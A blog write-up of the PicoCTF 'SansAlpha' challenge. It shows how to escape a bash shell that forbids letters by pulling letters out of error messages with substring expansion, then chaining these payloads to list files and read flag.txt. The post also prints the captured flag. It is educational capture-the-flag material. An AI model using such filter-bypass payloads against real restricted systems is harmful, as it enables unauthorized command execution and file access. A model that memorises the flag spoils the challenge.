---
title: "PicoCTF SansAlpha Writeup"
date: 2025-01-05T11:55:52+05:30
draft: false
tags:
- PicoCTF
- Bash
- Sandbox Escape
- Python
- CTF
---

Hey everyone, since 2024 hasn't seen a lot of posts on this blog, I plan to
start this year off by going back to the roots.

I'll be focusing on posting more CTF writeups again! Today's challenge is
_SansAlpha_ from PicoCTF. The challenge description states

> The Multiverse is within your grasp! Unfortunately, the server that contains
the secrets of the multiverse is in a universe where keyboards only have numbers
and (most) symbols.

It is tagged as a _shell escape_, which means we will be dropped in a restricted
environment and our job would be to break out of the sandbox.

After launching and remoting into the machine with the given credentials, we are
greeted with a bash prompt.

```
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1016-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sun Jan  5 06:15:52 2025 from 127.0.0.1
SansAlpha$
```

The moment we issue a command, however, we get an error saying an unknown character was detected.

```
SansAlpha$ id
SansAlpha: Unknown character detected
```

However, numerals and symbols still work. So we can still perform basic arithmetic like the following:

```sh
$((1+2))
```

```
bash: 3: command not found
```

Now the description makes more sense, we are only allowed to use numbers and
symbols as the input. Alphabets are forbidden, hence the title, _sans alpha_.

The hint for the challenge says

> Where can you get some letters?

We could get some letters perhaps by reading a file. To do that, we still need
to use some utility like `cat` and we need to supply a known filename.

Surprisingly enough, we can still trigger a division by zero error.

```sh
$((1/0))
```

```
bash: 1/0: division by 0 (error token is "0")
```

But of course, we can get some letters from the _errors!_

Here's an outline of our plan:
- Perform a command substitution with the `$(somecommand)` notation inside a string
- Ensure that the command substition returns an error
- Use the letters or substrings from the error for the next payload

We'll run the commands on a local machine first to make sure the outputs match our expectations.

Let's continue with the division by zero example. We want to perform this division inside
a subshell as a string substitution.

> Note: the syntax highlighter on my website is freaking out on this command.  
The perfect bash highlighter doesn't exist.

```sh
"$( ((1/0)) )"
```

The inner two pairs of braces are performing the math. The outermost braces are
performing the command substitution. Thus, we are passing the arithmetic error
string `1/0: division by 0 (error token is "0")` as the command to be run.

We can check this by asking bash for the most recent command using the special
variable `$_`.

```sh
echo $_
```

Which gives us ... nothing? Well, that's because the error is being printed on
standard error `stderr` instead of the standard output `stdout`.

To pass the error as the next command to be evaluated, we need to redirect
`stderr` at file descriptor 2 to `stdout` at file descriptor 1 with a `2>&1`
expression.

```sh
"$( ((1/0)) 2>&1 )"
```

Now looking up the last command returns the error message.

```sh
echo $_
```

```
bash: ((: 1/0: division by 0 (error token is "0")
```

## Triggering a text editor

We can follow up with a substring from this error. The syntax for picking a substring in bash is
a bit different from other languages. It is of the form

```sh
${variable:offset:length}
```

- The `variable`, in our case `_`, is what stores the original string
- `offset` is where the substring begins
- `length` is how far the substring goes from the start

In fact, the di**vi**sion error message contains the substring `vi` which we could use to spin up the `vi` text editor.
To get that substring, we find its index. Let's use the index method in python for this.

```python
'bash: ((: 1/0: division by 0 (error token is "0")'.index('vi')
```

This gives us 17. Knowing that `vi` is 2 letters, we can build the following payload.

```sh
${_:17:2}
```

Since this payload depends on the error before it, we must detonate that first.
We will run the following on the picoCTF machine:

```sh
"$(((1/0)) 2>&1)"
${_:17:2}
```

```
bash: bash: ((: 1/0: division by 0 (error token is "0"): No such file or directory
bash: vi: command not found
```

Looks like one of the most ubiquitous text editors isn't available on this machine!

If we were to successfully launch `vi`, we could type the sequence `:!` followed
by a command to execute it in a shell.

## Getting a lay of the land

We can still gather letters from other error messages. Let's take a look around
to get a feel for where the flag might be. To list the contents of the current
directory, we need to run the `ls` command.

As there's no letter 'l' in the division by zero error, we could trigger a
different error like trying to source a nonexistent file like `1` using the
dot command.

```
"$(. 1 2>&1)"
```

```
bash: 1: No such file or directory
```

## Building gadgets

We can use the same substring technique as in the previous section to extract
characters from the error message. To automate this, we create a small python
function.

```python
def generate(haystack: str, to_build: str):
    return ''.join(
        "${{_:{}:1}}".format(
            haystack.index(needle)
        )
        for needle in to_build
    )
```

- `haystack` refers to the error message wherein we look for the letters
- `needle` represents each letter that come together `to_build` the command we want to issue.

The outputs of such small functions that work together to build a larger exploit
are call _"gadgets"_.

## Chaining gadgets

We can call the function like the following to build the payload for calling `ls`:

```python
msg = 'bash: 1: No such file or directory'
generate(msg, 'ls')
```

```sh
${_:19:1}${_:2:1}
```

Let's use this immediately after detonating the sourcing error.
Putting everything together, we'll run the following payload on the picoCTF machine.

```sh
"$(. 1 2>&1)"
${_:19:1}${_:2:1}
```

```
bash: bash: 1: No such file or directory: command not found
blargh    on-calastran.txt
```

We find a directory called "blargh" and a text file called "on-calastran.txt" in
our working directory. Let's try to list the contents of the `blargh` directory
using `ls blargh`.

```python
generate(msg, 'ls blargh')
```

```
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<stdin>", line 2, in generate
  File "<stdin>", line 3, in <genexpr>
ValueError: substring not found
```

Why are we unable to generate a payload for this command? If we look closely, we
see this happens because the letter 'g' is not in the error message.

## Globbing to the rescue

We can always resort to globbing with `*/**`, matching all paths at depth 2. We
simply need to append it to the previous payload since special characters work
just fine.

```sh
"$(. 1 2>&1)"
${_:19:1}${_:2:1} */**
```

Running this on the picoCTF machine tells us that the flag resides in the
"blargh" directory.

```
blargh/flag.txt  blargh/on-alpha-9.txt
```

We can view the contents of `flag.txt` using the `cat` utility.

To avoid matching the other `on-alpha-9.txt` file and printing its contents,
we can distinguish the `flag.txt` by its first letter 'f' in the glob. Thus, to
view the flag, our target command will be `cat */f*`.

Let's generate the gadget for this round.

```python
print(generate(msg, 'cat') + " */" + generate(msg, "f") + "*")
```

```sh
${_:14:1}${_:1:1}${_:30:1} */${_:17:1}*    
```

We will append this to the first gadget and run them together.

```sh
"$(. 1 2>&1)"
${_:14:1}${_:1:1}${_:30:1} */${_:17:1}*    
```

Running this on the picoCTF machine finally fetches us the flag!

```
return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_b0d5e855}
```

I really enjoy coming back to these CTF challenges because they force you to
think out of the box.

That's all for now. I hope you learned something. See you soon!
